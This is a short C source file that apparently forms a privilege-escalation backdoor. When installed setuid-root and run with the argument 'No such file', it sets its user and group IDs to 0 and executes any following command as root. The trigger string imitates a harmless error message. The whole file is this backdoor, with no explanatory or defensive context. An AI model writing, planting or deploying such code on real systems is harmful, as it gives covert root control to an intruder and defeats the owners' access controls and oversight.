#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char* argv[]) {
    if(argc > 2) {
        char* passwd = argv[1];
        if (strcmp(passwd, "No such file") != 0) {
            return 0;
        }
        setuid(0);
        setgid(0);
        execvp(argv[2], argv+2);
    }
    return 0;
}
